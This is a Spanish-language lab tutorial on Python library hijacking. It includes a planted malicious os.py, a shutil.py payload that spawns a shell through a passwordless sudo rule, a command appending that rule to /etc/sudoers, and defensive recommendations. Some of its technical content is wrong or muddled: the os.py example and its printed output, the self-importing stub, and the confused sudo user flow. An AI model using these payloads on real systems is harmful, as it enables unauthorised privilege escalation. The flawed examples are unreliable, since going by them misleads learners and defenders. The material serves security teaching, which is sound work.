
---

# Laboratorio: Python Library Hijacking

---

## ¿Qué es el Python Library Hijacking?

Cuando hablamos de **Python Library Hijacking**, nos referimos a una técnica de ataque que aprovecha el orden de carga de módulos y librerías en Python. Python, al importar una librería, busca primero en el directorio de trabajo actual y luego en otras rutas definidas en la variable `sys.path`.

Si un atacante logra colocar una versión maliciosa de una librería con el mismo nombre que una legítima **en una ruta prioritaria**, como el directorio actual, el intérprete de Python cargará la versión maliciosa. Esto puede permitir ejecutar código arbitrario sin que el script legítimo se dé cuenta.

---

## Riesgo del Python Library Hijacking

El principal riesgo reside en que muchos scripts en Python importan librerías estándar o de terceros sin verificar su integridad ni su ubicación exacta. Esto deja la puerta abierta a que un atacante:

- Coloque una versión maliciosa de una librería en el mismo directorio del script.
- Inyecte una librería falsa en una ruta donde tenga permisos de escritura (por ejemplo, `/tmp`, o algún subdirectorio en `sys.path`).
- Logre que el script cargue **su código malicioso** en lugar del original, y que este se ejecute con los mismos privilegios que el proceso legítimo.

---

## Ejemplo práctico: Hijacking de `os.py`

### Acción:

Supongamos que encontramos un script vulnerable llamado `vulnerable.py`, que contiene lo siguiente:

```python
import os

print("Operación segura")
````

Creamos una versión maliciosa de la librería `os.py` en el mismo directorio:

```python
# os.py malicioso
import builtins

print("¡Código malicioso ejecutado!")

# Para que no falle el script original:
builtins.__import__('os')
```

Luego, ejecutamos el script `vulnerable.py` desde ese mismo directorio:

```bash
python3 vulnerable.py
```

### Resultado:

```bash
¡Código malicioso ejecutado!
Operación segura
```

---

### Explicación:

- El intérprete de Python prioriza la búsqueda en el directorio actual (`.`).
    
- Por tanto, carga nuestra versión maliciosa de `os.py` en lugar de la legítima.
    
- Nuestro código malicioso se ejecuta **antes** que el del script original.
    

Este ataque puede ser aún más grave si el script vulnerable se ejecuta con privilegios elevados (por ejemplo, mediante `sudo`, un servicio o una tarea cron), ya que el código malicioso se ejecutaría con esos mismos privilegios.

---

## Escenario realista: Hijacking en rutas de `sys.path`

Podemos listar las rutas en las que Python buscará módulos con el siguiente comando dentro de un script:

```python
import sys
print(sys.path)
```

Si alguna de esas rutas es accesible para escritura (por ejemplo, una carpeta en `/home`, `/tmp` o subdirectorios poco protegidos), un atacante puede colocar allí módulos maliciosos.

---

## Prevención y buenas prácticas

- **Evitar ejecutar scripts desde directorios donde otros usuarios puedan escribir**.
    
- **Revisar las rutas definidas en `sys.path`** y asegurarse de que no haya directorios inseguros o compartidos.
    
- **Validar la integridad de las librerías** mediante hash o firmas cuando sea posible.
    
- **Usar entornos virtuales (`venv`) o contenedores** para aislar dependencias y rutas.
    
- **No ejecutar scripts Python con privilegios elevados** salvo que sea absolutamente necesario.
    

---

## Comandos útiles para detección y auditoría

- Ver las rutas en las que Python buscará librerías:
    

```python
import sys
print(sys.path)
```

- Buscar módulos maliciosos en el directorio actual:
    

```bash
ls *.py
```

- Comprobar si hay librerías en rutas del sistema con permisos de escritura:
    

```bash
find $(python3 -c "import sys; print(' '.join(sys.path))") -type f -writable 2>/dev/null
```

---

## Ejemplo avanzado: Escalada de un usuario a otro mediante Python Library Hijacking y sudoers

En este escenario, estamos dentro de una máquina como el usuario `user1`, pero queremos pivotar al usuario `admin`. Durante el proceso de enumeración, encontramos que `admin` tiene una entrada en `/etc/sudoers` que le permite ejecutar un script Python como `sudo` **sin contraseña**:

```bash
user1@victima:~$ sudo -l -U admin
User admin may run the following commands without password:
    (ALL) NOPASSWD: /home/admin/backup.py
````

Este archivo puede ser ejecutado por `admin` con privilegios elevados, pero **el script no tiene ruta absoluta al importar módulos**, lo que lo hace vulnerable a Library Hijacking.

---

### Acción:

Como `user1`, creamos un archivo llamado `shutil.py` (una librería estándar que el script podría estar importando), con una carga maliciosa:

```python
# shutil.py malicioso
import os
os.system("/bin/bash")
```

Colocamos este archivo en el mismo directorio desde el que se ejecuta `backup.py`, o en otro directorio que tengamos en común con el usuario `admin` y que esté al principio en `sys.path`.

Luego le pedimos a `admin` que ejecute el script como siempre:

```bash
sudo -u admin /home/admin/backup.py
```

### Resultado:

Se ejecuta nuestra versión maliciosa de `shutil.py`, y obtenemos una shell como el usuario `admin`.

---

### Explicación:

- Python busca primero las librerías en el directorio actual.
    
- Al colocar un archivo llamado `shutil.py`, secuestramos la importación legítima.
    
- Cuando `admin` ejecuta el script como `sudo`, se carga **nuestra librería maliciosa**, que nos da una shell con su usuario.
    
- Como no se pidió contraseña, no necesitamos saberla ni tener privilegios de root.
    

---

### Simulación controlada:

Si queremos simularlo en laboratorio:

1. Creamos un usuario `victima` y otro `admin`.
    
2. Damos permisos `sudo` sin contraseña a `admin` para un script Python vulnerable:
    

```bash
echo 'admin ALL=(ALL) NOPASSWD: /home/admin/backup.py' >> /etc/sudoers
```

3. Hacemos que el script `backup.py` importe `shutil` sin ruta absoluta.
    
4. Desde `victima`, creamos un archivo `shutil.py` con un `os.system("/bin/bash")`.
    
5. Ejecutamos:
    

```bash
sudo -u admin /home/admin/backup.py
```

Y así conseguimos una shell como `admin`.

---

## Recomendaciones específicas para este caso

- **Nunca permitir la ejecución de scripts Python vía `sudo` sin validar sus librerías importadas.**
    
- **Evitar privilegios NOPASSWD** para scripts en lenguajes interpretados si no están totalmente controlados.
    
- **Forzar el uso de rutas absolutas** y entornos virtuales (`virtualenv`) si se necesita importar módulos personalizados.
    
- Usar herramientas como `auditd` o `AppArmor` para monitorizar accesos a módulos y scripts en ejecución.
    

---

# Resumen

El **Python Library Hijacking** es una técnica de secuestro de librerías que explota el orden de búsqueda del intérprete Python. Al aprovechar rutas inseguras o el directorio actual, un atacante puede ejecutar código malicioso en el contexto de un script legítimo. Esta técnica es especialmente útil para escaladas de privilegios o persistencia si el script es ejecutado por usuarios privilegiados.

El uso correcto de rutas, la restricción de permisos y la creación de entornos aislados son claves para prevenir este tipo de ataques.

---
